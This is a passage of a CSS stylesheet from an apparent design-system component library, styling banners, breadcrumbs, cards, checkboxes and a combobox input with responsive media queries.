  .stamp-spotlight-banner--media-type-illustration .stamp-spotlight-banner__decoration-container { --decoration-block-size: 1087px; --decoration-inline-size: 1100px; --decoration-stroke-width: 5.25px; --decoration-rotation: 0deg; }
}

@media (min-width: 880px) {
  .stamp-spotlight-banner--media-type-image { --image-offset: 136px; --image-inline-size: auto; --image-block-size: calc(100% + var(--image-offset)); }
  .stamp-spotlight-banner--media-type-illustration { --illustration-size: clamp(340px, -23px + 41.25vi, 505px); --illustration-block-padding: 0 var(--stamp-spacing-inner-xl); min-block-size: unset; }
  .stamp-spotlight-banner--media-type-image .stamp-spotlight-banner__content, .stamp-spotlight-banner--media-type-illustration .stamp-spotlight-banner__content { display: grid; grid-template-areas: &quot;text media&quot;; grid-template-rows: auto; column-gap: var(--stamp-spacing-inner-3-xl); }
  .stamp-spotlight-banner--media-type-image .stamp-spotlight-banner__content { grid-template-columns: 58% 42%; min-block-size: 413px; }
  .stamp-spotlight-banner--media-type-illustration .stamp-spotlight-banner__content { grid-template-columns: minmax(0, 1fr) var(--illustration-size); min-block-size: var(--illustration-size); }
  .stamp-spotlight-banner__text { grid-area: text; align-self: center; display: flex; flex-direction: column; gap: 0px; }
  .stamp-spotlight-banner__header { margin-block-start: 0px; }
  .stamp-spotlight-banner--media-type-image .stamp-spotlight-banner__media { grid-area: media; align-self: start; position: absolute; inset-inline: unset; inset-block: unset; margin-inline: unset; margin-block: unset; block-size: var(--image-block-size); inline-size: auto; aspect-ratio: 1 / 1; }
  .stamp-spotlight-banner--media-type-image:has(.stamp-spotlight-banner__header + .stamp-spotlight-banner__footer) .stamp-spotlight-banner__header { margin-block-end: 0px; }
  .stamp-spotlight-banner--media-type-image .stamp-spotlight-banner__decoration-container { --decoration-block-size: 1236px; --decoration-inline-size: 1242px; --decoration-rotation: 0deg; --decoration-stroke-width: 5px; inset-inline-start: unset; inset-inline-end: 37%; inset-block-start: 50%; inset-block-end: unset; transform: translateY(-50%); }
  .stamp-spotlight-banner--media-type-illustration .stamp-spotlight-banner__decoration-container { --decoration-block-size: 1680px; --decoration-inline-size: 1700px; --decoration-stroke-width: 3.75px; --decoration-rotation: 0deg; inset-inline-end: calc((var(--illustration-size) / 2) - 80px); }
}

@media (min-width: 1024px) {
  .stamp-spotlight-banner--media-type-illustration .stamp-spotlight-banner__decoration-container { inset-inline-end: calc((var(--illustration-size) / 2) - 100px); }
}

@media (min-width: 1280px) {
  .stamp-spotlight-banner--media-type-image .stamp-spotlight-banner__decoration-container { inset-inline-end: 38%; }
}

.stamp-emphasis-banner { position: relative; z-index: var(--z-index-base); padding-block: var(--stamp-spacing-outer-m); }

.stamp-emphasis-banner--media-type-image { --image-inline-size: 100vw; --image-block-size: auto; }

.stamp-emphasis-banner--media-type-illustration { --illustration-size: clamp(275px, 50px + 62.5vi, 350px); --illustration-block-padding: 0; --decoration-offset: 34px; display: flex; justify-content: space-around; flex-direction: column; min-block-size: var(--illustration-size); }

.stamp-emphasis-banner__content { position: relative; display: grid; grid-template-rows: repeat(4, auto); grid-template-columns: 100%; }

.stamp-emphasis-banner--media-type-image .stamp-emphasis-banner__content { grid-template-areas: &quot;header&quot; &quot;media&quot; &quot;body&quot; &quot;footer&quot;; }

.stamp-emphasis-banner--media-type-illustration .stamp-emphasis-banner__content { grid-template-areas: &quot;header&quot; &quot;body&quot; &quot;footer&quot; &quot;media&quot;; padding-block: var(--illustration-block-padding); }

.stamp-emphasis-banner__header, .stamp-emphasis-banner__body, .stamp-emphasis-banner__footer { display: flex; flex-direction: column; }

.stamp-emphasis-banner--media-type-illustration .stamp-emphasis-banner__header, .stamp-emphasis-banner--media-type-illustration .stamp-emphasis-banner__body, .stamp-emphasis-banner--media-type-illustration .stamp-emphasis-banner__footer { margin-inline-end: var(--decoration-offset); }

.stamp-emphasis-banner__header { grid-area: header; gap: var(--stamp-spacing-inner-s); margin-block-end: var(--stamp-spacing-inner-xl); }

.stamp-emphasis-banner__body { grid-area: body; }

.stamp-emphasis-banner--media-type-image .stamp-emphasis-banner__body { margin-block-start: var(--stamp-spacing-inner-xl); }

.stamp-emphasis-banner__footer { grid-area: footer; flex-flow: wrap; align-items: center; column-gap: var(--stamp-spacing-inner-xxl); row-gap: var(--stamp-spacing-inner-xl); margin-block-start: var(--stamp-spacing-inner-xl); }

.stamp-emphasis-banner__media { grid-area: media; overflow: hidden; }

.stamp-emphasis-banner--media-type-image .stamp-emphasis-banner__media { position: relative; inset-inline: 50%; margin-inline: -50vw; inline-size: var(--image-inline-size); block-size: var(--image-block-size); max-block-size: 200px; }

.stamp-emphasis-banner--media-type-illustration .stamp-emphasis-banner__media { display: flex; align-items: center; margin-inline: auto; block-size: var(--illustration-size); inline-size: var(--illustration-size); }

.stamp-emphasis-banner--media-type-image .stamp-emphasis-banner__media img, .stamp-emphasis-banner--media-type-image .stamp-emphasis-banner__media picture { display: block; inline-size: 100%; block-size: 100%; object-fit: cover; }

.stamp-emphasis-banner__decoration-container { --decoration-block-size: 823px; --decoration-inline-size: 829px; --decoration-stroke-width: 6px; --decoration-rotation: 75deg; position: absolute; z-index: var(--z-index-below); inset-inline-start: 36%; inset-block-end: calc((var(--illustration-size) / 2) - 10px); transform: translateX(-50%); block-size: var(--decoration-block-size); inline-size: var(--decoration-inline-size); }

.stamp-emphasis-banner__decoration { transform-origin: center center 0px; transform: rotate(var(--decoration-rotation)); }

.stamp-emphasis-banner__decoration path { stroke-width: var(--decoration-stroke-width); }

@media (min-width: 480px) {
  .stamp-emphasis-banner--media-type-illustration { --illustration-size: clamp(170px, -142px + 65vi, 300px); --illustration-block-padding: var(--stamp-spacing-inner-s) var(--stamp-spacing-inner-xxl); --decoration-offset: 0; }
  .stamp-emphasis-banner--media-type-illustration .stamp-emphasis-banner__content { grid-template-areas: &quot;header media&quot; &quot;body media&quot; &quot;footer media&quot;; grid-template-rows: repeat(3, auto); grid-template-columns: 1fr var(--illustration-size); column-gap: var(--stamp-spacing-inner-xxl); }
  .stamp-emphasis-banner--media-type-illustration .stamp-emphasis-banner__header { gap: var(--stamp-spacing-inner-m); margin-block-end: 0px; }
  .stamp-emphasis-banner--media-type-illustration .stamp-emphasis-banner__body, .stamp-emphasis-banner--media-type-illustration .stamp-emphasis-banner__footer { margin-block-start: 0px; }
  .stamp-emphasis-banner--media-type-illustration .stamp-emphasis-banner__header + .stamp-emphasis-banner__body, .stamp-emphasis-banner--media-type-illustration .stamp-emphasis-banner__header + .stamp-emphasis-banner__footer, .stamp-emphasis-banner--media-type-illustration .stamp-emphasis-banner__body + .stamp-emphasis-banner__footer { margin-block-start: var(--stamp-spacing-inner-xl); }
  .stamp-emphasis-banner--media-type-illustration .stamp-emphasis-banner__media { position: absolute; align-self: center; margin-inline: unset; }
  .stamp-emphasis-banner__decoration-container { --decoration-block-size: 612px; --decoration-inline-size: 620px; --decoration-stroke-width: 7.5px; --decoration-rotation: 145deg; inset-block-end: calc(50% - (var(--decoration-block-size) / 2)); inset-inline-start: calc(100vw - (var(--illustration-size) / 2) - var(--stamp-spacing-outer-m) - 80px); transform: translateX(0px); }
}

@media (min-width: 680px) {
  .stamp-emphasis-banner { padding-block: 0px; }
  .stamp-emphasis-banner--media-type-illustration { --illustration-size: clamp(250px, 80px + 25vi, 300px); --illustration-block-padding: var(--stamp-spacing-inner-s) var(--stamp-spacing-inner-xxl); }
  .stamp-emphasis-banner--media-type-image .stamp-emphasis-banner__content, .stamp-emphasis-banner--media-type-illustration .stamp-emphasis-banner__content { grid-template-areas: &quot;header media&quot; &quot;body media&quot; &quot;footer media&quot;; grid-template-rows: repeat(3, auto); column-gap: var(--stamp-spacing-inner-3-xl); }
  .stamp-emphasis-banner--media-type-image .stamp-emphasis-banner__content { grid-template-columns: repeat(2, 1fr); }
  .stamp-emphasis-banner--media-type-illustration .stamp-emphasis-banner__content { grid-template-columns: 1fr var(--illustration-size); }
  .stamp-emphasis-banner__body, .stamp-emphasis-banner__footer, .stamp-emphasis-banner__header { margin-inline: 0px; }
  .stamp-emphasis-banner__header { gap: var(--stamp-spacing-inner-m); }
  .stamp-emphasis-banner__header { margin-block-start: var(--stamp-spacing-inner-xxl); margin-block-end: 0px; }
  .stamp-emphasis-banner__body { margin-block-start: var(--stamp-spacing-inner-xl); }
  .stamp-emphasis-banner__footer { margin-block-start: var(--stamp-spacing-inner-xxl); }
  .stamp-emphasis-banner:has(.stamp-emphasis-banner__footer) .stamp-emphasis-banner__footer, .stamp-emphasis-banner:not(:has(.stamp-emphasis-banner__footer)) .stamp-emphasis-banner__body { margin-block-end: var(--stamp-spacing-inner-xxl); }
  .stamp-emphasis-banner__media { inset-inline-end: 0px; }
  .stamp-emphasis-banner--media-type-image .stamp-emphasis-banner__media { position: absolute; inset-inline: unset; margin-inline: unset; max-block-size: unset; inline-size: 100vw; block-size: 100%; max-inline-size: 100%; }
  .stamp-emphasis-banner--media-type-illustration .stamp-emphasis-banner__media { position: absolute; align-self: center; margin-inline: unset; }
  .stamp-emphasis-banner__decoration-container { --decoration-block-size: 612px; --decoration-inline-size: 620px; --decoration-stroke-width: 8px; --decoration-rotation: 145deg; inset-inline-start: calc(100vw - (var(--illustration-size) / 2) - var(--stamp-spacing-outer-xl) - 80px); }
}

@media (min-width: 880px) {
  .stamp-emphasis-banner--media-type-illustration { --illustration-size: clamp(315px, -21.6px + 38.25vi, 468px); --illustration-block-padding: 0 var(--stamp-spacing-inner-xl); }
  .stamp-emphasis-banner__decoration-container { --decoration-block-size: clamp(630px, 212px + 47.5vi, 820px); --decoration-inline-size: clamp(640px, 222px + 47.5vi, 830px); --decoration-rotation: -255deg; inset-inline-start: calc(100vw - var(--decoration-inline-size) + (var(--illustration-size) / 2) + 80px); }
}

@media (min-width: 1102px) {
  .stamp-emphasis-banner__decoration-container { inset-inline-start: 1013px; transform: translateX(-50%); }
}

@media (min-width: 1280px) {
  .stamp-emphasis-banner__decoration-container { inset-inline-start: calc(1013px + calc(var(--stamp-spacing-outer-xl) * 2)); }
}

.stamp-basic-banner { padding-block: var(--stamp-spacing-outer-m) var(--stamp-spacing-inner-xxl); }

.stamp-basic-banner__content { position: relative; display: grid; grid-template-areas: &quot;header&quot; &quot;media&quot; &quot;body&quot; &quot;footer&quot;; grid-template-rows: repeat(4, auto); grid-template-columns: 100%; background-color: var(--stamp-color-background-surface); }

.stamp-basic-banner__header, .stamp-basic-banner__body, .stamp-basic-banner__footer { display: flex; flex-direction: column; }

.stamp-basic-banner__header { grid-area: header; gap: var(--stamp-spacing-inner-s); margin-block-end: var(--stamp-spacing-inner-xl); }

.stamp-basic-banner__body { grid-area: body; margin-block-start: var(--stamp-spacing-inner-xl); }

.stamp-basic-banner__footer { grid-area: footer; flex-flow: wrap; align-items: center; column-gap: var(--stamp-spacing-inner-xxl); row-gap: var(--stamp-spacing-inner-xl); margin-block-start: var(--stamp-spacing-inner-xl); }

.stamp-basic-banner__media { grid-area: media; overflow: hidden; position: relative; inset-inline: 50%; margin-inline: -50vw; inline-size: 100vw; max-block-size: 200px; }

.stamp-basic-banner__media img, .stamp-basic-banner__media picture { display: block; inline-size: 100%; block-size: 100%; object-fit: cover; }

@media (min-width: 680px) {
  .stamp-basic-banner { padding-block: 0px; }
  .stamp-basic-banner__content { grid-template-areas: &quot;header media&quot; &quot;body media&quot; &quot;footer media&quot;; grid-template-columns: repeat(2, 1fr); column-gap: var(--stamp-spacing-inner-3-xl); }
  .stamp-basic-banner__body, .stamp-basic-banner__footer, .stamp-basic-banner__header { margin-inline: 0px; }
  .stamp-basic-banner__header { gap: var(--stamp-spacing-inner-m); }
  .stamp-basic-banner__footer { display: flex; flex-flow: wrap; }
  .stamp-basic-banner__header { margin-block-start: var(--stamp-spacing-inner-xxl); margin-block-end: 0px; }
  .stamp-basic-banner__body { margin-block-start: var(--stamp-spacing-inner-xl); }
  .stamp-basic-banner__footer { margin-block-start: var(--stamp-spacing-inner-xxl); }
  .stamp-basic-banner:has(.stamp-basic-banner__footer) .stamp-basic-banner__footer, .stamp-basic-banner:not(:has(.stamp-basic-banner__footer)) .stamp-basic-banner__body { margin-block-end: var(--stamp-spacing-inner-xxl); }
  .stamp-basic-banner__media { position: absolute; inset-inline: unset; block-size: 100%; max-block-size: unset; max-inline-size: 100%; margin-inline: unset; }
}

.stamp-breadcrumbs--small, a.stamp-breadcrumbs--small { }

.stamp-breadcrumbs--small .stamp-breadcrumb__item, a.stamp-breadcrumbs--small .stamp-breadcrumb__item { align-items: center; }

.stamp-breadcrumbs--small .stamp-breadcrumbs__link-icon, a.stamp-breadcrumbs--small .stamp-breadcrumbs__link-icon { padding-block-start: 3px; }

.stamp-breadcrumbs--large { display: none; }

.stamp-breadcrumbs__list { display: inline; }

.stamp-breadcrumbs--large .stamp-breadcrumbs__list { list-style: none; }

@media (min-width: 880px) {
  .stamp-breadcrumbs--small, a.stamp-breadcrumbs--small { display: none; }
  .stamp-breadcrumbs--large { display: block; }
}

.stamp-breadcrumbs__link-icon { max-inline-size: 8px; max-block-size: 8px; display: inline; color: var(--stamp-color-icon-default); }

.stamp-breadcrumbs-ellipsis { margin-inline-end: 6px; }

.stamp-breadcrumb { display: inline; font-family: var(--stamp-text-link-s-default-font-family); font-weight: var(--stamp-text-link-s-default-font-weight); font-size: var(--stamp-text-link-s-default-font-size); line-height: var(--stamp-text-link-s-default-line-height); letter-spacing: var(--stamp-text-link-s-default-letter-spacing); }

.stamp-breadcrumb__icon { display: inline-flex; justify-content: center; align-items: center; color: var(--stamp-color-icon-default); }

.stamp-breadcrumb__item .stamp-link__content { display: inline; }

.stamp-breadcrumb__icon { vertical-align: middle; inline-size: 8px; block-size: 8px; }

.stamp-breadcrumb__icon .stamp-icon__content { display: inline-flex; align-items: center; }

.stamp-breadcrumb__icon .stamp-icon__content svg { inline-size: 8px; block-size: 8px; }

.stamp-breadcrumb__icon--start, .stamp-breadcrumb__icon--end { margin-inline-end: 6px; }

.stamp-card { --card-background-color: var(--stamp-color-background-surface); position: relative; inline-size: 100%; block-size: 100%; padding-block-start: var(--stamp-spacing-inner-xl); background-color: var(--card-background-color); text-decoration: none; list-style-type: none; border-width: var(--stamp-border-width-s); border-style: solid; border-color: var(--stamp-color-border-fallback); border-radius: var(--stamp-radius-s); }

.stamp-card__inner { display: grid; grid-template-rows: min-content auto min-content; inline-size: 100%; block-size: 100%; }

.stamp-card.stamp-card--size-s { max-inline-size: 359px; }

.stamp-card--theme-default { --card-background-color: var(--stamp-color-background-card-neutral-default); --card-link-background-color: var(--stamp-color-background-card-neutral-accent); }

.stamp-card:has(.stamp-card-link).stamp-card--theme-default { --card-footer-border-color: var(--stamp-color-background-card-neutral-accent); }

.stamp-card--theme-inverse { --card-background-color: var(--stamp-color-background-card-inverse-default); --card-link-background-color: var(--stamp-color-background-card-inverse-accent); --card-link-border-top-color: var(--stamp-color-border-default); }

.stamp-card--theme-orange { --card-background-color: var(--stamp-color-background-card-brand-orange-default); --card-link-background-color: var(--stamp-color-background-card-brand-orange-accent); }

.stamp-card:has(.stamp-card-link).stamp-card--theme-orange { --card-footer-border-color: var(--stamp-color-background-card-brand-orange-accent); }

.stamp-card--theme-dark-blue { --card-background-color: var(--stamp-color-background-card-brand-dark-blue-default); --card-link-background-color: var(--stamp-color-background-card-brand-dark-blue-accent); }

.stamp-card:has(.stamp-card-link).stamp-card--theme-dark-blue { --card-footer-border-color: var(--stamp-color-background-card-brand-dark-blue-accent); }

.stamp-card--theme-blue { --card-background-color: var(--stamp-color-background-card-brand-blue-default); --card-link-background-color: var(--stamp-color-background-card-brand-blue-accent); }

.stamp-card:has(.stamp-card-link).stamp-card--theme-blue { --card-footer-border-color: var(--stamp-color-background-card-brand-blue-accent); }

.stamp-card--theme-green { --card-background-color: var(--stamp-color-background-card-brand-green-default); --card-link-background-color: var(--stamp-color-background-card-brand-green-accent); }

.stamp-card:has(.stamp-card-link).stamp-card--theme-green { --card-footer-border-color: var(--stamp-color-background-card-brand-green-accent); }

.stamp-card--theme-red { --card-background-color: var(--stamp-color-background-card-brand-red-default); --card-link-background-color: var(--stamp-color-background-card-brand-red-accent); }

.stamp-card:has(.stamp-card-link).stamp-card--theme-red { --card-footer-border-color: var(--stamp-color-background-card-brand-red-accent); }

.stamp-card--theme-orange, .stamp-card--theme-orange [class*=&quot;stamp-&quot;], .stamp-card--theme-dark-blue, .stamp-card--theme-dark-blue [class*=&quot;stamp-&quot;], .stamp-card--theme-blue, .stamp-card--theme-blue [class*=&quot;stamp-&quot;], .stamp-card--theme-green, .stamp-card--theme-green [class*=&quot;stamp-&quot;], .stamp-card--theme-red, .stamp-card--theme-red [class*=&quot;stamp-&quot;] { color: var(--stamp-color-text-on-brand); }

.stamp-card--theme-orange [class*=&quot;stamp-heading&quot;], .stamp-card--theme-dark-blue [class*=&quot;stamp-heading&quot;], .stamp-card--theme-blue [class*=&quot;stamp-heading&quot;], .stamp-card--theme-green [class*=&quot;stamp-heading&quot;], .stamp-card--theme-red [class*=&quot;stamp-heading&quot;] { color: var(--stamp-color-heading-on-brand); }

.stamp-card--theme-orange [class*=&quot;stamp-text&quot;], .stamp-card--theme-dark-blue [class*=&quot;stamp-text&quot;], .stamp-card--theme-blue [class*=&quot;stamp-text&quot;], .stamp-card--theme-green [class*=&quot;stamp-text&quot;], .stamp-card--theme-red [class*=&quot;stamp-text&quot;] { color: var(--stamp-color-text-on-brand); }

.stamp-card--theme-orange .stamp-card-link [class*=&quot;stamp-&quot;], .stamp-card--theme-dark-blue .stamp-card-link [class*=&quot;stamp-&quot;], .stamp-card--theme-blue .stamp-card-link [class*=&quot;stamp-&quot;], .stamp-card--theme-green .stamp-card-link [class*=&quot;stamp-&quot;], .stamp-card--theme-red .stamp-card-link [class*=&quot;stamp-&quot;] { color: var(--stamp-color-text-link-on-brand); outline-color: var(--stamp-color-text-link-on-brand); }

.stamp-card--theme-orange .stamp-card-button[class*=&quot;stamp-&quot;], .stamp-card--theme-dark-blue .stamp-card-button[class*=&quot;stamp-&quot;], .stamp-card--theme-blue .stamp-card-button[class*=&quot;stamp-&quot;], .stamp-card--theme-green .stamp-card-button[class*=&quot;stamp-&quot;], .stamp-card--theme-red .stamp-card-button[class*=&quot;stamp-&quot;] { color: var(--stamp-color-text-on-brand); outline-color: var(--stamp-color-text-on-brand); }

.stamp-card--theme-orange [class*=&quot;stamp-icon&quot;], .stamp-card--theme-dark-blue [class*=&quot;stamp-icon&quot;], .stamp-card--theme-blue [class*=&quot;stamp-icon&quot;], .stamp-card--theme-green [class*=&quot;stamp-icon&quot;], .stamp-card--theme-red [class*=&quot;stamp-icon&quot;], .stamp-card--theme-orange .stamp-card-link .stamp-link__icon, .stamp-card--theme-dark-blue .stamp-card-link .stamp-link__icon, .stamp-card--theme-blue .stamp-card-link .stamp-link__icon, .stamp-card--theme-green .stamp-card-link .stamp-link__icon, .stamp-card--theme-red .stamp-card-link .stamp-link__icon { color: var(--stamp-color-icon-on-brand); }

.stamp-card__header { margin-block-end: var(--stamp-spacing-inner-s); padding-inline: var(--stamp-spacing-inner-xl); }

.stamp-card__body { inline-size: 100%; margin-block-end: var(--stamp-spacing-outer-m); padding-inline: var(--stamp-spacing-inner-xl); }

@media screen and (min-width: 481px) {
  .stamp-card__body > .stamp-text { max-inline-size: 532px; }
}

.stamp-card__footer { display: flex; flex-flow: column wrap; gap: var(--stamp-spacing-inner-l); padding-inline: var(--stamp-spacing-inner-xl); border-width: var(--stamp-border-width-s); border-style: solid; border-color: var(--card-footer-border-color, var(--stamp-color-border-fallback)); border-radius: 0 0 var(--stamp-radius-s) var(--stamp-radius-s); }

.stamp-card:has(.stamp-card-link) .stamp-card__footer { background-color: var(--card-link-background-color); border-top: var(--stamp-border-width-s) solid var(--card-link-border-top-color, var(--stamp-color-border-fallback)); }

.stamp-card.stamp-card--in-list { margin-block: calc(var(--stamp-spacing-inner-xxl) / 2); }

.stamp-card--spotlight { border-color: var(--stamp-color-border-selected); }

.stamp-card--spotlight.stamp-card--in-list { inline-size: calc(100% + var(--stamp-spacing-inner-xxl)); }

.stamp-card__spotlight { position: absolute; inset-block-start: 0px; inset-inline-start: 50%; padding: var(--stamp-spacing-inner-xs) var(--stamp-spacing-inner-s); transform: translateX(-50%) translateY(-50%); z-index: 1; color: var(--stamp-color-text-inverse); border-radius: var(--stamp-radius-s) var(--stamp-radius-s) 0 var(--stamp-radius-s); background-color: var(--stamp-color-background-brand); font-family: var(--stamp-text-body-l-default-font-family), sans-serif; font-weight: 700; line-height: var(--stamp-text-body-l-default-line-height); font-size: var(--stamp-text-body-l-default-font-size); letter-spacing: var(--stamp-text-body-l-default-letter-spacing); }

.stamp-card-button { position: relative; z-index: 1; align-self: flex-start; }

.stamp-card-button:last-child { margin-block-end: var(--stamp-spacing-inner-xl); }

.stamp-card-button--block { position: static; }

.stamp-card-button--block::after { z-index: 0; content: &quot;&quot;; position: absolute; top: 0px; left: 0px; inline-size: 100%; block-size: 100%; }

.stamp-card-link { display: flex; gap: var(--stamp-spacing-outer-xs); padding-block: var(--stamp-spacing-inner-l); inline-size: 100%; }

.stamp-card-link .stamp-link { gap: var(--stamp-spacing-inner-xs); }

.stamp-card-link__link--block { position: static; }

a.stamp-card-link--block::after, div.stamp-card-link--block a::after { z-index: 0; content: &quot;&quot;; position: absolute; top: 0px; left: 0px; inline-size: 100%; block-size: 100%; }

.stamp-card-list { display: flex; gap: var(--stamp-spacing-inner-xl); }

.stamp-checkbox-input { appearance: none; font: inherit; margin: 0px; padding: var(--stamp-spacing-inner-xxs); inline-size: 24px; block-size: 24px; border-width: var(--stamp-border-width-s); border-style: solid; border-color: var(--stamp-color-border-strong); cursor: pointer; position: relative; border-radius: var(--stamp-radius-s); flex-shrink: 0; align-self: start; background-color: var(--stamp-color-background-surface); }

.stamp-checkbox-input:not(:disabled):hover { border-color: var(--stamp-color-border-hover); }

.stamp-checkbox-input::before { content: &quot;&quot;; position: absolute; inset-inline-start: calc(50% - var(--stamp-size-icon-s) / 2); inset-block-start: calc(50% - var(--stamp-size-icon-s) / 2); inline-size: var(--stamp-size-icon-s); block-size: var(--stamp-size-icon-s); }

.stamp-checkbox-input:checked:disabled:not(:indeterminate)::before { background: url(&quot;&quot;) no-repeat; }

.stamp-checkbox-input:checked:not(:disabled):not(:indeterminate)::before { background: url(&quot;&quot;) no-repeat; }

.stamp-checkbox-input--invalid:checked:not(:disabled):not(:indeterminate)::before { background: url(&quot;&quot;) no-repeat; }

.stamp-checkbox-input--invalid { border-color: var(--stamp-color-border-error); }

.stamp-checkbox-input:not(:disabled):focus { outline-color: var(--stamp-color-border-focus-outline); outline-style: solid; outline-width: var(--stamp-border-width-m); outline-offset: 1px; }

@supports selector(:focus-visible) {
  .stamp-checkbox-input:not(:disabled):focus { outline: none; }
  .stamp-checkbox-input:not(:disabled):focus-visible { outline-color: var(--stamp-color-border-focus-outline); outline-style: solid; outline-width: var(--stamp-border-width-m); outline-offset: 1px; }
}

.stamp-checkbox-input:disabled { border-color: var(--stamp-color-border-disabled); background-color: var(--stamp-color-background-disabled); cursor: not-allowed; }

.stamp-checkbox-input:indeterminate:not(.stamp-checkbox-input--invalid) { background-position: 0% 0%; background-repeat: no-repeat; background-attachment: scroll; background-image: url(&quot;&quot;); background-size: auto; background-origin: padding-box; background-clip: border-box; background-color: var(--stamp-color-background-disabled); }

.stamp-checkbox-input:indeterminate:not(.stamp-checkbox-input--invalid):not(:disabled) { background: url(&quot;&quot;) no-repeat; }

.stamp-checkbox-input--invalid:indeterminate { background: url(&quot;&quot;) no-repeat; border-color: var(--stamp-color-border-error); }

.stamp-checkbox-button { position: relative; }

.stamp-checkbox-button__label { position: relative; cursor: pointer; padding-inline-start: var(--stamp-spacing-inner-4-xl); padding-inline-end: var(--stamp-spacing-inner-l); min-height: 72px; display: flex; align-items: center; border-style: solid; border-width: var(--stamp-border-width-s); border-color: var(--stamp-color-border-fallback); border-radius: var(--stamp-radius-xs); background-color: var(--stamp-color-background-variant); color: var(--stamp-color-text-form-control-value-default); }

.stamp-checkbox-button__illustration { position: relative; margin-inline-start: calc(var(--stamp-spacing-inner-m) * -1); opacity: var(--stamp-opacity-illustration-default); mix-blend-mode: var(--stamp-blend-mode-default); }

.stamp-checkbox-button--disabled .stamp-checkbox-button__illustration { opacity: var(--stamp-opacity-illustration-disabled); mix-blend-mode: var(--stamp-blend-mode-disabled); }

.stamp-checkbox-button__illustration-badge { display: block; position: absolute; inline-size: 30%; block-size: 30%; inset-block-start: 12%; inset-inline-end: 8%; }

.stamp-checkbox-button__illustration-badge .stamp-icon, .stamp-checkbox-button__illustration-badge svg { display: block; inline-size: 100%; block-size: 100%; }

.stamp-checkbox-button__text-content { display: flex; flex-direction: column; padding-block: calc(var(--stamp-spacing-inner-l) - var(--stamp-border-width-s)); padding-inline-start: var(--stamp-spacing-inner-s); }

.stamp-checkbox-button--disabled .stamp-checkbox-button__label { cursor: not-allowed; background-color: var(--stamp-color-background-disabled); color: var(--stamp-color-text-form-control-value-disabled); }

.stamp-checkbox-button--disabled .stamp-checkbox-button__input { cursor: not-allowed; border-color: var(--stamp-color-border-disabled); background-color: var(--stamp-color-background-disabled); }

.stamp-checkbox-button--invalid .stamp-checkbox-button__label { border-color: var(--stamp-color-border-error); }

.stamp-checkbox-button:not(.stamp-checkbox-button--disabled):hover .stamp-checkbox-button__label { border-color: var(--stamp-color-border-hover); }

.stamp-checkbox-button .stamp-checkbox-button__input:focus ~ .stamp-checkbox-button__label { outline-style: solid; outline-color: var(--stamp-color-border-focus-outline); outline-width: var(--stamp-border-width-m); outline-offset: 5px; }

@supports selector(:focus-visible) {
  .stamp-checkbox-button .stamp-checkbox-button__input:focus ~ .stamp-checkbox-button__label { outline: none; }
  .stamp-checkbox-button .stamp-checkbox-button__input:focus-visible ~ .stamp-checkbox-button__label { outline-style: solid; outline-color: var(--stamp-color-border-focus-outline); outline-width: var(--stamp-border-width-m); outline-offset: 5px; }
}

.stamp-checkbox-button__title { font-family: var(--stamp-text-form-label-font-family), sans-serif; font-weight: var(--stamp-text-form-label-font-weight); line-height: var(--stamp-text-form-label-line-height); font-size: var(--stamp-text-form-label-font-size); letter-spacing: var(--stamp-text-form-label-letter-spacing); }

.stamp-checkbox-button__message { font-family: var(--stamp-text-body-m-default-font-family), sans-serif; font-weight: var(--stamp-text-body-m-default-font-weight); line-height: var(--stamp-text-body-m-default-line-height); font-size: var(--stamp-text-body-m-default-font-size); letter-spacing: var(--stamp-text-body-m-default-letter-spacing); }

.stamp-checkbox-button__input { appearance: none; z-index: 1; font: inherit; margin: 0px; padding: var(--stamp-spacing-inner-xxs); inline-size: 24px; block-size: 24px; border-width: var(--stamp-border-width-s); border-style: solid; border-color: var(--stamp-color-border-strong); cursor: pointer; border-radius: var(--stamp-radius-s); position: absolute; inset-inline-start: 16px; inset-block-start: 50%; transform: translateY(-50%); }

.stamp-checkbox-button__input:is(:checked, :indeterminate)::before { content: &quot;&quot;; position: absolute; left: calc(50% - var(--stamp-size-icon-s) / 2); top: calc(50% - var(--stamp-size-icon-s) / 2); inline-size: var(--stamp-size-icon-s); block-size: var(--stamp-size-icon-s); }

.stamp-checkbox-button__input:checked:not(:disabled):not(:indeterminate)::before { background: url(&quot;&quot;) no-repeat; }

.stamp-checkbox-button__input:checked:disabled:not(:indeterminate)::before { background: url(&quot;&quot;) no-repeat; }

.stamp-checkbox-button:not(.stamp-checkbox-button--invalid) .stamp-checkbox-button__input:indeterminate { background-position: 0% 0%; background-repeat: no-repeat; background-attachment: scroll; background-image: url(&quot;&quot;); background-size: auto; background-origin: padding-box; background-clip: border-box; background-color: var(--stamp-color-background-disabled); }

.stamp-checkbox-button:not(.stamp-checkbox-button--invalid) .stamp-checkbox-button__input:indeterminate:not(:disabled) { background: url(&quot;&quot;) no-repeat; }

.stamp-checkbox-button.stamp-checkbox-button--invalid .stamp-checkbox-button__input:indeterminate { background: url(&quot;&quot;) no-repeat; border-color: var(--stamp-color-border-error); }

.stamp-checkbox-button__input:checked:not(:disabled) ~ .stamp-checkbox-button__label::before { content: &quot;&quot;; position: absolute; inset-inline-start: calc(-1 * (var(--stamp-border-width-s))); inset-block-start: calc(-1 * var(--stamp-border-width-s)); inline-size: calc(100% + (2 * var(--stamp-border-width-s))); block-size: calc(100% + (2 * var(--stamp-border-width-s))); outline: 2px solid var(--stamp-color-border-selected); outline-offset: 2px; border-radius: var(--stamp-radius-xs); }

.stamp-checkbox-button--invalid .stamp-checkbox-button__input:checked:not(:disabled) ~ .stamp-checkbox-button__label { border-color: var(--stamp-color-border-error); }

.stamp-checkbox-button__input:not(:disabled):focus { outline: none; }

.stamp-combobox-input { position: relative; inline-size: 100%; }

.stamp-combobox-input__icon { width: var(--stamp-size-icon-m); block-size: 100%; position: absolute; display: flex; align-items: center; inset-inline-start: var(--stamp-spacing-inner-s); color: var(--stamp-color-icon-default); }

.stamp-combobox-input__input { padding-inline-start: var(--stamp-spacing-inner-l); padding-inline-end: var(--stamp-spacing-inner-xxl); padding-block: var(--stamp-spacing-inner-s); border-width: var(--stamp-border-width-s); border-color: var(--stamp-color-border-strong); font-family: var(--stamp-text-body-m-default-font-family), sans-serif; font-weight: var(--stamp-text-body-m-default-font-weight); line-height: var(--stamp-text-body-m-default-line-height); font-size: var(--stamp-text-body-m-default-font-size); letter-spacing: var(--stamp-text-body-m-default-letter-spacing); border-radius: var(--stamp-radius-s); border-style: solid; z-index: 1; appearance: none; inline-size: 100%; overflow: hidden; white-space: nowrap; text-overflow: ellipsis; background-color: var(--stamp-color-background-surface); color: var(--stamp-color-text-form-control-value-default); }

.stamp-combobox-input__input--has-icon { padding-inline-start: calc(var(--stamp-spacing-inner-m) + var(--stamp-size-icon-m)); }
